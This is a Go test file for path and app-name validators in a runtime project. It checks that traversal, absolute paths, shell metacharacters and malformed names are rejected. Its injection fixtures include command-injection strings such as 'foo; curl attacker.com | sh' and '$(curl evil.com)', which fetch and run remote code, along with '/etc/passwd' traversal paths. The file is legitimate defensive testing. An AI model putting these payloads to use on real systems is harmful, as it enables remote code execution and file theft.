// SPDX-License-Identifier: Apache-2.0
// Copyright 2025-2026 The LoopRuntime Authors

package validation

import (
	"strings"
	"testing"
)

func TestValidateAppPath_ValidPaths(t *testing.T) {
	valid := []string{
		"",
		".",
		"apps/api",
		"services/web",
		"src/backend",
		"packages/shared-utils",
		"my_app",
		"my-app",
		"apps/my.app",
		"a",
		"apps/api/v2",
	}

	for _, path := range valid {
		if err := ValidateAppPath(path); err != nil {
			t.Errorf("ValidateAppPath(%q) should be valid, got error: %v", path, err)
		}
	}
}

func TestValidateAppPath_PathTraversal(t *testing.T) {
	traversal := []string{
		"..",
		"../etc",
		"apps/../../etc/passwd",
		"foo/../bar",
	}

	for _, path := range traversal {
		err := ValidateAppPath(path)
		if err == nil {
			t.Errorf("ValidateAppPath(%q) should reject path traversal", path)
		}
		if err != nil && !strings.Contains(err.Error(), "..") {
			t.Errorf("ValidateAppPath(%q) error should mention '..', got: %v", path, err)
		}
	}
}

func TestValidateAppPath_AbsolutePaths(t *testing.T) {
	absolute := []string{
		"/etc/passwd",
		"/workspace/foo",
		"/",
	}

	for _, path := range absolute {
		err := ValidateAppPath(path)
		if err == nil {
			t.Errorf("ValidateAppPath(%q) should reject absolute path", path)
		}
		if err != nil && !strings.Contains(err.Error(), "absolute") {
			t.Errorf("ValidateAppPath(%q) error should mention 'absolute', got: %v", path, err)
		}
	}
}

func TestValidateAppPath_ShellMetacharacters(t *testing.T) {
	shellInjection := []string{
		"foo;bar",
		"foo|bar",
		"foo&bar",
		"$(whoami)",
		"foo`id`bar",
		"foo bar",
		"foo\tbar",
		"foo\nbar",
		"foo\"bar",
		"foo'bar",
		"foo<bar",
		"foo>bar",
		"foo{bar}",
		"foo(bar)",
		"foo!bar",
		"foo\\bar",
		"foo$PATH",
	}

	for _, path := range shellInjection {
		err := ValidateAppPath(path)
		if err == nil {
			t.Errorf("ValidateAppPath(%q) should reject shell metacharacters", path)
		}
	}
}

func TestValidateAppPath_TooLong(t *testing.T) {
	long := strings.Repeat("a", 256)
	err := ValidateAppPath(long)
	if err == nil {
		t.Error("ValidateAppPath should reject paths > 255 characters")
	}
	if err != nil && !strings.Contains(err.Error(), "too long") {
		t.Errorf("error should mention 'too long', got: %v", err)
	}
}

func TestValidateAppPath_TrailingSlash(t *testing.T) {
	err := ValidateAppPath("apps/api/")
	if err == nil {
		t.Error("ValidateAppPath should reject trailing slash")
	}
}

// ---------------------------------------------------------------------------
// ValidateAppName tests (CODE-001 fix)
// ---------------------------------------------------------------------------

func TestValidateAppName_ValidNames(t *testing.T) {
	valid := []string{
		"api",
		"web",
		"worker",
		"my-app",
		"frontend-v2",
		"a",
		"abc123",
		"a-b-c",
	}

	for _, name := range valid {
		if err := ValidateAppName(name); err != nil {
			t.Errorf("ValidateAppName(%q) should be valid, got error: %v", name, err)
		}
	}
}

func TestValidateAppName_Empty(t *testing.T) {
	err := ValidateAppName("")
	if err == nil {
		t.Error("ValidateAppName should reject empty name")
	}
}

func TestValidateAppName_ShellInjection(t *testing.T) {
	// CODE-001: these are the exact attack vectors that were possible before the fix
	injection := []string{
		"foo; curl attacker.com | sh",
		"foo$(whoami)",
		"foo`id`",
		"foo|bar",
		"foo&bar",
		"foo\nbar",
		"foo bar",
		"foo;bar",
		"$(curl evil.com)",
	}

	for _, name := range injection {
		err := ValidateAppName(name)
		if err == nil {
			t.Errorf("ValidateAppName(%q) should reject shell injection attempt", name)
		}
	}
}

func TestValidateAppName_InvalidFormat(t *testing.T) {
	invalid := []string{
		"MyApp",                 // uppercase not allowed
		"123app",                // must start with letter
		"-app",                  // must start with letter
		"app_name",              // underscores not allowed (RFC 1123)
		"app.name",              // dots not allowed
		"app/name",              // slashes not allowed
		strings.Repeat("a", 64), // too long (max 63)
	}

	for _, name := range invalid {
		err := ValidateAppName(name)
		if err == nil {
			t.Errorf("ValidateAppName(%q) should reject invalid format", name)
		}
	}
}
